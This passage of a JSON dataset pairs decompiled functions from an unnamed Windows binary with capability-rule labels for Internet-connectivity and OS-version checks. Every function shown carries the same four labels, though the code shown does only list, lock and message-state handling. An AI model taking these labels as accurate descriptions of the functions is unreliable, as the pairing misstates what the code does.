(var_18h < 3) {\n                if ((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) {\n                    var_2ch = 0x2159000a;\n                    goto code_r0x0007358f;\n                }\n                fcn.00076610(*(arg_8h + 4), var_20h);\n                var_20h = NULL;\n            }\n            else {\n                var_38h = var_38h & 0xff000000 | *var_20h;\n                fcn.00071df0(&var_38h);\n                if ((var_38h & 0x4000) == 0) {\n                    uVar4 = fcn.0006be20();\n                    *(arg_8h + 0x70) = uVar4;\n                    var_24h._0_1_ = var_38h;\n                    if ((((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) && ((var_38h & 0x100) == 0)) &&\n                       ((var_38h & 0x2000) == 0)) {\n                        if (*(arg_8h + 0x10) != 2) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_2_ = CONCAT11(0x20, var_24h);\n                            fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                        }\n                        fcn.00076610(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                    else if (((*(arg_8h + 0x10) == 0) && ((var_38h & 0x200) == 0)) && ((var_38h & 0x2000) == 0)) {\n                        var_24h._2_1_ = var_38h._2_1_;\n                        var_24h._0_2_ = CONCAT11(2, var_24h);\n                        fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                        fcn.00076610(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                    else {\n                        if ((((*(arg_8h + 0x10) == 1) && ((var_38h & 0x100) != 0)) && ((var_38h & 0x400) == 0)) ||\n                           ((*(arg_8h + 0x10) == 3 &&\n                            ((((var_38h & 0x1000) != 0 || ((var_38h & 0x100) != 0)) && ((var_38h & 0x400) == 0)))))) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_2_ = var_38h | 0x400;\n                            var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                            if (var_2ch != 0) goto code_r0x0007358f;\n                            if (((var_38h & 0x100) != 0) && (*(arg_8h + 0x10) == 1)) {\n                                *(arg_8h + 0x15) = var_38h + '\\x01';\n                                *(arg_8h + 0x10) = 3;\n                            }\n                        }\n                        if (((*(arg_8h + 0x10) == 3) || (*(arg_8h + 0x10) == 2)) &&\n                           (((var_38h & 0x400) != 0 &&\n                            (((var_38h & 0x1000) == 0 && ((var_38h & 0xff) == *(arg_8h + 0x14))))))) {\n                            if (((var_38h & 0x100) != 0) && (*(arg_8h + 0x10) == 2)) {\n                                *(arg_8h + 0x10) = 3;\n                            }\n                            if (arg_ch == 1) {\n                                *arg_10h = var_38h._2_1_;\n                                var_2ch = 0;\n                                goto code_r0x0007358f;\n                            }\n                            fcn.00034550(arg_8h + 0x48);\n                            *(arg_8h + 0x58) = var_38h._2_1_;\n                            *(arg_8h + 0x5c) = 1;\n                            fcn.000340b0(arg_8h + 0x54);\n                            fcn.000345c0(arg_8h + 0x48);\n                        }\n                        if (((var_38h & 0x2000) != 0) &&\n                           (((var_38h & 0xff) == *(arg_8h + 0x14) || ((var_38h & 0xff) == *(arg_8h + 0x15))))) {\n                            *(arg_8h + 0x10) = 0;\n                            var_2ch = 0x21590003;\n                            goto code_r0x0007358f;\n                        }\n                        if ((*(arg_8h + 0x10) == 3) && ((var_38h & 0x800) != 0)) {\n                            var_24h._0_1_ = var_38h;\n                            if ((var_38h & 0xff) == *(arg_8h + 0x15)) {\n                                if (arg_ch == 2) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                                    if (var_2ch == 0) {\n                                        *(arg_8h + 0x15) = *(arg_8h + 0x15) + '\\x01';\n                                        *arg_14h = var_20h + 1;\n                                        *arg_18h = var_18h - 3;\n                                        var_20h = NULL;\n                                        var_2ch = 0;\n                                    }\n                                    goto code_r0x0007358f;\n                                }\n                                var_38h = arg_8h + 0x48;\n                                fcn.00034550(var_38h);\n                                if (*(arg_8h + 0xc) != 0) {\n                                    var_2ch = 0x21590006;\n                                    fcn.000345c0(arg_8h + 0x48);\n                                    goto code_r0x0007358f;\n                                }\n                                if (*(arg_8h + 8) == 0) {\n                                    var_2ch = 0x21590003;\n                                    fcn.000345c0(arg_8h + 0x48);\n                                    goto code_r0x0007358f;\n                                }\n                                if ((*(arg_8h + 0x68) + var_18h < 0x100000) &&\n                                   (var_28h = fcn.00035200(0x10),  var_28h != NULL)) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_1_ = var_38h;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                                    if (var_2ch != 0) {\n                                        fcn.000345c0(arg_8h + 0x48);\n                                        goto code_r0x0007358f;\n                                    }\n                                    *var_28h = 0;\n                                    var_28h[1] = 0;\n                                    var_28h[2] = 0;\n                                    var_28h[3] = 0;\n                                    var_28h[1] = var_20h;\n                                    var_28h[2] = var_18h;\n                                    var_20h = NULL;\n                                    if (*(arg_8h + 100) == 0) {\n                                        *(arg_8h + 0x60) = var_28h;\n                                    }\n                                    else {\n                                        **(arg_8h + 100) = var_28h;\n                                    }\n                                    *(arg_8h + 100) = var_28h;\n                                    *(arg_8h + 0x68) = *(arg_8h + 0x68) + var_18h;\n                                    var_38h = arg_8h + 0x54;\n                                    fcn.000340b0(var_38h);\n                                    *(arg_8h + 0x15) = *(arg_8h + 0x15) + '\\x01';\n                                }\n                                fcn.000345c0(arg_8h + 0x48);\n                            }\n                            else {\n                                if (*(arg_8h + 0x15) - (var_38h & 0xff) < 0x7f) {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(4, var_24h);\n                                    var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                                }\n                                else {\n                                    var_24h._2_1_ = var_38h._2_1_;\n                                    var_24h._0_2_ = CONCAT11(0x20, var_24h);\n                                    var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                                }\n                                if (var_2ch != 0) goto code_r0x0007358f;\n                            }\n                        }\n                        if (((var_38h & 0x200) != 0) && ((var_38h & 0xff) == *(arg_8h + 0x15))) {\n                            var_24h._2_1_ = var_38h._2_1_;\n                            var_24h._0_1_ = var_38h;\n                            var_24h._0_2_ = CONCAT11(4, var_24h);\n                            var_2ch = fcn.000725b0(arg_8h, 0, 0, &var_24h);\n                            if (var_2ch != 0) goto code_r0x0007358f;\n                            *(arg_8h + 0x10) = 0;\n                            *(arg_8h + 8) = 0;\n                            fcn.000340b0(arg_8h + 0x54);\n                        }\n                        fcn.00076610(*(arg_8h + 4), var_20h);\n                        var_20h = NULL;\n                    }\n                }\n                else {\n                    if ((*(arg_8h + 0x10) == 2) || (*(arg_8h + 0x10) == 1)) {\n                        var_2ch = 0x2159000a;\n                        goto code_r0x0007358f;\n                    }\n                    fcn.00076610(*(arg_8h + 4), var_20h);\n                    var_20h = NULL;\n                }\n            }\n        }\n        else {\n            if (var_2ch != 0x21590002) goto code_r0x0007358f;\n            iVar2 = fcn.0006be20();\n            var_ch = iVar2 - *(arg_8h + 0x70);\n            if (*(arg_8h + 0x38) * *(arg_8h + 0x34) <= var_ch) {\n                *(arg_8h + 8) = 0;\n                goto code_r0x0007358f;\n            }\n            if ((var_14h == 0) || (arg_1ch == 0)) goto code_r0x0007358f;\n        }\n    }\n    var_2ch = 0x21590003;\ncode_r0x0007358f:\n    fcn.00076610(*(arg_8h + 4), var_20h);\n    return var_2ch;\n}\n",
        "token_count": 3868
    },
    "000735f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.000735f0(uint *arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    (**0xb1bde00c)();\n    var_ch = *arg_8h;\n    while (var_ch != NULL) {\n        puVar1 = *var_ch;\n        if (arg_ch != '\\0') {\n            fcn.00035330(var_ch[1]);\n        }\n        fcn.00035330(var_ch);\n        var_ch = puVar1;\n    }\n    (**0xb1bde010)();\n    fcn.00034080(arg_8h + 3);\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    arg_8h[4] = 0;\n    return;\n}\n",
        "token_count": 235
    },
    "00073680": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00073680(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (((arg_8h == 0) || (arg_10h == NULL)) || (arg_14h == NULL)) {\n        uVar1 = 0x21590064;\n    }\n    else {\n        puVar2 = fcn.00035230(0x1c);\n        if (puVar2 == NULL) {\n            uVar1 = 0x21590004;\n        }\n        else {\n            puVar2[1] = arg_8h;\n            puVar2[2] = arg_ch;\n            *puVar2 = 0;\n            puVar2[3] = *arg_14h;\n            puVar2[4] = arg_14h[1];\n            puVar2[5] = arg_14h[2];\n            puVar2[6] = arg_14h[3];\n            (**0xb1bde00c)();\n            if (*arg_10h == 0) {\n                arg_10h[1] = puVar2;\n                *arg_10h = puVar2;\n            }\n            else {\n                *arg_10h[1] = puVar2;\n                arg_10h[1] = puVar2;\n            }\n            arg_10h[2] = arg_10h[2] + arg_ch;\n            (**0xb1bde010)();\n            fcn.000340b0(arg_10h + 3);\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 412
    },
    "00073770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00073770(uint *arg_8h, uint *arg_ch, int32_t *arg_10h, uint *arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    if (((arg_10h == NULL) || (arg_ch == NULL)) || (arg_14h == NULL)) {\n        var_8h = 0x21590064;\n    }\n    else {\n        (**0xb1bde00c)();\n        if (*arg_10h == 0) {\n            var_8h = 0xffffffff;\n        }\n        else {\n            arg_8h_00 = *arg_10h;\n            *arg_8h = arg_8h_00[1];\n            *arg_ch = arg_8h_00[2];\n            *arg_14h = arg_8h_00[3];\n            arg_14h[1] = arg_8h_00[4];\n            arg_14h[2] = arg_8h_00[5];\n            arg_14h[3] = arg_8h_00[6];\n            *arg_10h = *arg_8h_00;\n            if (*arg_10h == 0) {\n                arg_10h[1] = 0;\n            }\n            arg_10h[2] = arg_10h[2] - arg_8h_00[2];\n            fcn.00035330(arg_8h_00);\n            var_8h = 0;\n        }\n        (**0xb1bde010)();\n    }\n    return var_8h;\n}\n",
        "token_count": 394
    },
    "00073870": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00073870(int32_t **arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h)\n\n{\n    char cVar1;\n    char *arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar2;\n    char *pcVar3;\n    uint32_t uVar4;\n    uint var_2ch;\n    uint var_24h;\n    char *var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_8h = NULL;\n    var_8h = 0;\n    while( true ) {\n        if (*(arg_ch + var_8h * 4) == 0) {\n            return 0x21590005;\n        }\n        arg_8h_00 = fcn.00035360(*(arg_ch + var_8h * 4));\n        if (arg_8h_00 == NULL) {\n            return 0x21590004;\n        }\n        var_18h = fcn.000785ce(arg_8h_00, 0x2e);\n        if (var_18h != NULL) {\n            *var_18h = 0;\n            var_18h = var_18h + 1;\n        }\n        pcVar3 = arg_8h_00;\n        uVar4 = arg_20h;\n        var_14h = fcn.00075820(arg_8h_00);\n        if (var_14h == 0) {\n            fcn.00035330(arg_8h_00);\n            var_10h = 0x21590005;\n            if ((*0xb1c67770 != 0) &&\n               (var_10h = (**(*0xb1c67770 + 0xc))\n                                    (arg_8h, *(arg_ch + var_8h * 4), arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, pcVar3\n                                     , uVar4),  var_10h == 0)) {\n                var_14h = *0xb1c67770;\n            }\n            if ((var_14h == 0) && (var_10h != 0x21590005)) {\n                return var_10h;\n            }\n        }\n        else {\n            if (var_18h == NULL) {\n                var_20h = arg_8h_00;\n                do {\n                    cVar1 = *var_20h;\n                    var_20h = var_20h + 1;\n                } while (cVar1 != '\\0');\n                var_ch = var_20h - (arg_8h_00 + 1);\n            }\n            else {\n                var_ch = var_18h - arg_8h_00;\n            }\n            fcn.00035330(arg_8h_00);\n            var_10h = (**(var_14h + 0xc))(arg_8h, *(arg_ch + var_8h * 4) + var_ch, arg_10h, arg_14h, arg_18h, arg_1ch, \n                                          arg_20h & 0xfffeffff);\n        }\n        if (var_14h != 0) break;\n        var_8h = var_8h + 1;\n    }\n    if (var_10h != 0) {\n        return var_10h;\n    }\n    if (*arg_8h != NULL) {\n        arg_8h_01 = fcn.00035200(0x18);\n        if (arg_8h_01 == NULL) {\n            (**(var_14h + 0x10))(*arg_8h, 0);\n            (**(var_14h + 0x14))(*arg_8h, 0);\n            *arg_8h = NULL;\n            return 0x21590004;\n        }\n        *arg_8h_01 = var_14h;\n        arg_8h_01[5] = 0;\n        fcn.00036a10(arg_8h_01 + 1);\n        **arg_8h = arg_8h_01;\n        iVar2 = fcn.0006cd00(*arg_8h, 1);\n        if (iVar2 != 0) {\n            return 0;\n        }\n        fcn.00036a80(arg_8h_01 + 1);\n        fcn.00035330(arg_8h_01);\n        (**(var_14h + 0x10))(*arg_8h, 0);\n        (**(var_14h + 0x14))(*arg_8h, 0);\n        *arg_8h = NULL;\n        return 0x21590004;\n    }\n    (**(var_14h + 0x10))(*arg_8h, 0);\n    (**(var_14h + 0x14))(*arg_8h, 0);\n    return -1;\n}\n",
        "token_count": 1182
    },
    "00073b30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00073b30(int32_t **arg_8h, uint arg_ch)\n\n{\n    int32_t **arg_8h_00;\n    int32_t *arg_8h_01;\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *arg_8h;\n    fcn.00034550(0xb1c5a8fc);\n    iVar1 = fcn.0006ce50(arg_8h_00, 1);\n    if (iVar1 == 0) {\n        fcn.000345c0(0xb1c5a8fc);\n        *arg_8h = NULL;\n    }\n    else {\n        arg_8h_01 = *arg_8h_00;\n        if (arg_8h_01[5] == 0) {\n            arg_8h_01[5] = 1;\n            fcn.000345c0(0xb1c5a8fc);\n            (**(**arg_8h_00 + 0x10))(arg_8h_00, arg_ch);\n            fcn.00036c40(arg_8h_01 + 1);\n            fcn.00034550(0xb1c5a8fc);\n            *arg_8h = NULL;\n            fcn.0006cd90(arg_8h_00, 1);\n            fcn.000345c0(0xb1c5a8fc);\n            (**(**arg_8h_00 + 0x14))(arg_8h_00, arg_ch);\n            fcn.00036cd0(arg_8h_01 + 1);\n            fcn.00036a80(arg_8h_01 + 1);\n            fcn.00035330(arg_8h_01);\n        }\n        else {\n            fcn.000345c0(0xb1c5a8fc);\n            *arg_8h = NULL;\n        }\n    }\n    return;\n}\n",
        "token_count": 450
    },
    "00073c40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __cdecl fcn.00073c40(int32_t **arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x1c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x1c) != 0)) {\n            var_4h = (**(**arg_8h + 0x1c))(arg_8h, arg_ch, arg_10h);\n            if (var_4h == 0) {\n                arg_8h_00 = fcn.00035200(0x18);\n                if (arg_8h_00 == NULL) {\n                    fcn.00036b60(*arg_8h + 1);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    return 0x21590004;\n                }\n                *arg_8h_00 = **arg_8h;\n                arg_8h_00[5] = 0;\n                fcn.00036a10(arg_8h_00 + 1);\n                **arg_ch = arg_8h_00;\n                iVar1 = fcn.0006cd00(*arg_ch, 1);\n                if (iVar1 == 0) {\n                    fcn.00036a80(arg_8h_00 + 1);\n                    fcn.00035330(arg_8h_00);\n                    (**(**arg_8h + 0x14))(*arg_ch, 0);\n                    *arg_ch = 0;\n                    var_4h = 0x21590004;\n                }\n            }\n            else if ((*arg_8h)[5] != 0) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 556
    },
    "00073dc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00073dc0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n    }\n    else {\n        var_4h = fcn.00074540(arg_8h);\n        if (var_4h == 0) {\n            if (((**arg_8h + 0x30) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x30) != 0)) {\n                var_4h = (**(**arg_8h + 0x30))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n                if (var_4h == 0) {\n                    var_4h = fcn.00076b80(arg_ch, arg_10h, arg_14h, arg_18h);\n                }\n                fcn.00036b60(*arg_8h + 1);\n            }\n            else {\n                fcn.00036b60(*arg_8h + 1);\n                var_4h = 0x21590001;\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 351
    },
    "00073ea0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00073ea0(int32_t **arg_8h, uint arg_ch)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x18) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x18) != 0)) {\n            var_4h = (**(**arg_8h + 0x18))(arg_8h, arg_ch);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 264
    },
    "00073f60": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00073f60(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x20) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x20) != 0)) {\n            var_4h = (**(**arg_8h + 0x20))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 275
    },
    "00074020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074020(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x24) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x24) != 0)) {\n            var_4h = (**(**arg_8h + 0x24))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 274
    },
    "000740e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000740e0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x28) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x28) != 0)) {\n            var_4h = (**(**arg_8h + 0x28))(arg_8h, arg_ch, arg_10h, arg_14h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 286
    },
    "000741a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.000741a0(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x2c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x2c) != 0)) {\n            var_4h = (**(**arg_8h + 0x2c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 300
    },
    "00074270": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074270(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x34) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x34) != 0)) {\n            var_4h = (**(**arg_8h + 0x34))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "00074340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074340(int32_t **arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x38) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x38) != 0)) {\n            var_4h = (**(**arg_8h + 0x38))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 296
    },
    "00074410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00074410(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t arg_ch_00;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = fcn.00074480(arg_8h, arg_ch, arg_10h);\n    if (var_ch == 0x21590001) {\n        arg_ch_00 = fcn.00075970(arg_ch, &var_4h);\n        if (arg_ch_00 == 0) {\n            var_ch = 0x21590004;\n        }\n        else {\n            var_ch = fcn.000740e0(arg_8h, arg_ch_00, var_4h, arg_10h);\n            fcn.00035330(arg_ch_00);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 199
    },
    "00074480": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00074480(int32_t **arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00074540(arg_8h);\n    if (var_4h == 0) {\n        if (((**arg_8h + 0x3c) - **arg_8h < ***arg_8h) && (*(**arg_8h + 0x3c) != 0)) {\n            var_4h = (**(**arg_8h + 0x3c))(arg_8h, arg_ch, arg_10h);\n            if ((var_4h != 0) && ((*arg_8h)[5] != 0)) {\n                var_4h = 0x21590006;\n            }\n            fcn.00036b60(*arg_8h + 1);\n        }\n        else {\n            fcn.00036b60(*arg_8h + 1);\n            var_4h = 0x21590001;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 277
    },
    "00074540": {
